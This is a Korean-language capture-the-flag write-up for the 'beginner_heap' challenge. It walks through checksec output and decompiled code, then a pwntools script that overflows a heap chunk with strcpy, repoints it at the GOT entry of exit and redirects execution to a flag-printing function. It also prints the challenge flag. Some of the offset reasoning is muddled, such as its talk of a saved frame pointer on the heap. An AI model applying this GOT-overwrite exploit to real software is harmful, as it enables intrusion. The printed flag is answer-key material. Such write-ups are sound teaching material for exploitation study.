@@ -1,0 +1,126 @@
+checksec 를 입력했을떄
+
+CANARY : disabled
+FORTIFY : disabled
+NX : ENABLED
+PIE : disabled
+RELRO : Partial
+
+
+이므로
+
+쉘코드는 사용이 불가능하다 따라서 got overwrite 가 가능하다.
+
+그리고 이문제는 IDA로 코드를 뜯어봤을때
+
+
+main.c
+
+void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  void *v3; // ST10_8
+  void *v4; // ST18_8
+  char s; // [rsp+20h] [rbp-1010h]
+  unsigned __int64 v6; // [rsp+1028h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  v3 = malloc(0x10uLL);
+  *(_DWORD *)v3 = 1;
+  *((_QWORD *)v3 + 1) = malloc(8uLL);
+  v4 = malloc(0x10uLL);
+  *(_DWORD *)v4 = 2;
+  *((_QWORD *)v4 + 1) = malloc(8uLL);
+  fgets(&s, 4096, stdin);
+  strcpy(*((char **)v3 + 1), &s);
+  fgets(&s, 4096, stdin);
+  strcpy(*((char **)v4 + 1), &s);
+  exit(0);
+}
+
+코드를 살펴보면 입력을 두번받는다. 그래서 리눅스 cmd창에서 실행시켰을때
+
+아무것도 뜨지않고 바로 입력을 받는데 2번을 받고 종료가 된다.
+
+malloc을 총 4번하고 fgets을 통해 입력한데이터가 strcpy함수를 이용하여 복사한다.
+
+그리고 위의 과정에서 취약점을 발견하고 got으로 덮을수있는지 확인하고 덮을수 있다면
+
+sub_400826주소를 덮어씌워서 실행시켜야한다.
+
+sub_400826 함수는
+
+void __noreturn sub_400826()
+{
+  __int128 lineptr; // [rsp+0h] [rbp-20h]
+  FILE *stream; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  lineptr = 0uLL;
+  stream = fopen("flag", "r");
+  getline((char **)&lineptr, (size_t *)&lineptr + 1, stream);
+  puts((const char *)lineptr);
+  fflush(stdout);
+  free((void *)lineptr);
+  _exit(1);
+}
+
+이다 이 함수에  flag 가 실행된다.
+
+일단 메모리구조에 대해서 생각해보자.
+
+
+malloc 으로 v3 v4를 10씩 할당했다 즉
+
+0x20 그리고 이것을 10진수로바꾸면 32이다.
+
+그리고 이 파일은 64바이트 이기떄문에 SFP 8바이트를 더해주면
+
+총 40바이트 버퍼는 40버퍼가 된다.
+
+그리고 exit(0)의 got주소를 찾아서 버퍼오버플로우를 시켜주고 
+
+그대로 sub_400826의 주소를 sendline 해주면 된다.
+
+sub_400826 주소 >> 0x400826 이다.
+
+
+따라서 페이로드 작성할떄
+
+40 + got 주소
+
+읽고
+
+sub 주소를 읽으면된다. 페이로드를 작성해보from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3016)
+e = ELF('./beginner_heap.bin')
+
+payload = 'A'*40
+payload += p64(e.got['exit'])
+
+payload2 = p64(0x400826)
+
+p.sendline(payload)
+p.sendline(payload2)
+p.interactive()
+
+
+이렇게 입력하면
+
+HackCTF{4r3_y0u_r34dy_w3lc0m3_70_h34p_53k41}
+
+획득가능.
+
+
+결론은 malloc 의 추가할당과 strcpy 쪽의 취약점을 이용해서
+
+malloc 의 총버퍼와  함수가 다끝났을시 마지막에 실행되는 exit 의 주소의 got 주소를 입력해서
+
+꽉 채우고 바로 flag가 적혀있는 sub 함수의 주소를 읽어 플래그를 획득한다.
+
+(32 + 8(SFP)) + 8(return address) >> got 주소
+
+읽고
+
+sub 함수 주소 sendline 으로 읽기
